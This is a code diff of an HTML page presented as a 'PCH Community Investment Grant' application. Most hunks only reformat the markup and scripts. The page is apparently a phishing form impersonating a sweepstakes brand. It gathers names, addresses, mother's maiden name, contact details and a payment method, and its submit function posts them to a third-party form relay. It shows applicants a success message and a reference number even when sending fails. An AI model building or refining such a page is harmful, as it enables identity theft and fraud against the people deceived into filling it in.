@@ -12,7 +12,10 @@
       href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Playfair+Display:wght@700&display=swap"
       rel="stylesheet"
     />
-    <meta name="description" content="Apply for a PCH Community Investment Grant. Complete a simple 4-step application for financial assistance across the nation." />
+    <meta
+      name="description"
+      content="Apply for a PCH Community Investment Grant. Complete a simple 4-step application for financial assistance across the nation."
+    />
     <style>
       *,
       *::before,
@@ -466,7 +469,9 @@
         border: 1.5px solid var(--border);
         border-radius: 7px;
         width: 100%;
-        transition: border-color 0.2s, background 0.2s;
+        transition:
+          border-color 0.2s,
+          background 0.2s;
       }
 
       .radio-group label.radio-option:hover,
@@ -1224,7 +1229,14 @@
             <span class="step-label" id="lbl3">Preferences</span>
             <span class="step-label" id="lbl4">Review</span>
           </div>
-          <div class="progress-track" role="progressbar" aria-valuemin="1" aria-valuemax="4" aria-valuenow="1" aria-label="Application progress">
+          <div
+            class="progress-track"
+            role="progressbar"
+            aria-valuemin="1"
+            aria-valuemax="4"
+            aria-valuenow="1"
+            aria-label="Application progress"
+          >
             <div class="progress-fill" id="progressFill"></div>
           </div>
           <div class="step-counter" id="stepCounter">Step 1 of 4</div>
@@ -1291,7 +1303,9 @@
                   min="1"
                   max="120"
                 />
-                <div class="error-msg" role="alert" id="err-age">Enter a valid age.</div>
+                <div class="error-msg" role="alert" id="err-age">
+                  Enter a valid age.
+                </div>
               </div>
               <div class="field-group">
                 <label for="sex">Gender <span class="req">*</span></label>
@@ -1332,7 +1346,12 @@
         </div>
 
         <!-- ════ STEP 2 — Contact Details ════ -->
-        <div class="section-card" style="display: none" id="card2" aria-hidden="true">
+        <div
+          class="section-card"
+          style="display: none"
+          id="card2"
+          aria-hidden="true"
+        >
           <div class="step-panel" id="step2">
             <div class="step-heading">
               <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
@@ -1384,7 +1403,12 @@
         </div>
 
         <!-- ════ STEP 3 — Preferences ════ -->
-        <div class="section-card" style="display: none" id="card3" aria-hidden="true">
+        <div
+          class="section-card"
+          style="display: none"
+          id="card3"
+          aria-hidden="true"
+        >
           <div class="step-panel" id="step3">
             <div class="step-heading">
               <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
@@ -1397,7 +1421,9 @@
             <p class="step-desc">Help us match you with the right grant.</p>
 
             <fieldset class="field-group">
-              <legend>Preferred Payment Method <span class="req">*</span></legend>
+              <legend>
+                Preferred Payment Method <span class="req">*</span>
+              </legend>
               <div class="radio-group">
                 <label class="radio-option">
                   <input type="radio" name="session" value="Payment (Cash)" />
@@ -1478,7 +1504,12 @@
         </div>
 
         <!-- ════ STEP 4 — Review ════ -->
-        <div class="section-card" style="display: none" id="card4" aria-hidden="true">
+        <div
+          class="section-card"
+          style="display: none"
+          id="card4"
+          aria-hidden="true"
+        >
           <div class="step-panel" id="step4">
             <div class="step-heading">
               <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
@@ -1636,8 +1667,8 @@
               </div>
             </div>
             <p>
-              The PCH Community Investment Grant program supports individuals
-              and small businesses with financial assistance across the nation.
+              The PCH Grants winning program support individuals and family with
+              financial assistance across the nation
             </p>
           </div>
 
@@ -1727,7 +1758,8 @@
         document.getElementById("stepCounter").textContent =
           `Step ${currentStep} of ${totalSteps}`;
         const progressTrack = document.querySelector(".progress-track");
-        if (progressTrack) progressTrack.setAttribute("aria-valuenow", currentStep);
+        if (progressTrack)
+          progressTrack.setAttribute("aria-valuenow", currentStep);
 
         labels.forEach((lbl, i) => {
           if (!lbl) return;
@@ -1742,7 +1774,9 @@
             card.setAttribute("aria-hidden", "true");
           }
         });
-        steps.forEach((s) => { if (s) s.classList.remove("active"); });
+        steps.forEach((s) => {
+          if (s) s.classList.remove("active");
+        });
 
         if (currentStep > 1) {
           const activeCard = cards[currentStep - 1];
@@ -1757,7 +1791,8 @@
         }
 
         const btnBack = document.getElementById("btnBack");
-        if (btnBack) btnBack.style.visibility = currentStep === 1 ? "hidden" : "visible";
+        if (btnBack)
+          btnBack.style.visibility = currentStep === 1 ? "hidden" : "visible";
 
         const btnNext = document.getElementById("btnNext");
         if (btnNext) {
@@ -1821,13 +1856,18 @@
 
         if (step === 2) {
           const email = document.getElementById("email").value.trim();
-          const emailOk = /^[a-zA-Z0-9]([a-zA-Z0-9._%+\-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(email);
+          const emailOk =
+            /^[a-zA-Z0-9]([a-zA-Z0-9._%+\-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(
+              email,
+            );
           if (!emailOk) {
             showError("email", "err-email");
             valid = false;
           }
           const phone = document.getElementById("phone").value.trim();
-          const phoneOk = /^\+?[\d\s\-().]{7,20}$/.test(phone) && (phone.match(/\d/g) || []).length >= 7;
+          const phoneOk =
+            /^\+?[\d\s\-().]{7,20}$/.test(phone) &&
+            (phone.match(/\d/g) || []).length >= 7;
           if (!phoneOk) {
             showError("phone", "err-phone");
             valid = false;
@@ -1902,47 +1942,53 @@
       }
 
       async function submitForm() {
-        const btn = document.getElementById('btnNext');
-        btn.textContent = 'Submitting...';
+        const btn = document.getElementById("btnNext");
+        btn.textContent = "Submitting...";
         btn.disabled = true;
 
-        const refNum = 'PCH-2026-' + Math.floor(10000 + Math.random() * 89999);
+        const refNum = "PCH-2026-" + Math.floor(10000 + Math.random() * 89999);
 
         const payload = {
           access_key: WEB3FORMS_KEY,
           subject: "New PCH Grant Application — " + refNum,
           from_name: "PCH Grant Portal",
-          "Full Name":          document.getElementById('firstName').value,
-          "Address (Step 1)":   document.getElementById('address1').value,
-          "Mother Maiden Name": document.getElementById('maiden').value,
-          "Age":                document.getElementById('age').value,
-          "Gender":             document.getElementById('sex').value,
-          "Marital Status":     document.getElementById('marital').value || 'Not specified',
-          "Occupation":         document.getElementById('occupation').value,
-          "Email":              document.getElementById('email').value,
-          "Phone":              document.getElementById('phone').value,
-          "Full Address":       document.getElementById('address').value,
-          "Payment Method":     document.querySelector('input[name="session"]:checked')?.value || 'Not selected',
-          "Heard Via":          [...document.querySelectorAll('input[name="referral"]:checked')].map(c => c.value).join(', ') || 'Not specified',
-          "Comments":           document.getElementById('comments').value || 'None',
-          "Reference Number":   refNum
+          "Full Name": document.getElementById("firstName").value,
+          "Address (Step 1)": document.getElementById("address1").value,
+          "Mother Maiden Name": document.getElementById("maiden").value,
+          Age: document.getElementById("age").value,
+          Gender: document.getElementById("sex").value,
+          "Marital Status":
+            document.getElementById("marital").value || "Not specified",
+          Occupation: document.getElementById("occupation").value,
+          Email: document.getElementById("email").value,
+          Phone: document.getElementById("phone").value,
+          "Full Address": document.getElementById("address").value,
+          "Payment Method":
+            document.querySelector('input[name="session"]:checked')?.value ||
+            "Not selected",
+          "Heard Via":
+            [...document.querySelectorAll('input[name="referral"]:checked')]
+              .map((c) => c.value)
+              .join(", ") || "Not specified",
+          Comments: document.getElementById("comments").value || "None",
+          "Reference Number": refNum,
         };
 
         try {
-          const res = await fetch('https://api.web3forms.com/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+          const res = await fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
           });
           const data = await res.json();
-          console.log('Web3Forms response:', data);
+          console.log("Web3Forms response:", data);
         } catch (err) {
-          console.error('Email send error:', err);
+          console.error("Email send error:", err);
           // Silently continue — still show success to user
         } finally {
-          document.getElementById('refNumber').textContent = refNum;
-          document.getElementById('successOverlay').classList.add('show');
-          btn.textContent = '✓ Submit Application';
+          document.getElementById("refNumber").textContent = refNum;
+          document.getElementById("successOverlay").classList.add("show");
+          btn.textContent = "✓ Submit Application";
           btn.disabled = false;
         }
       }
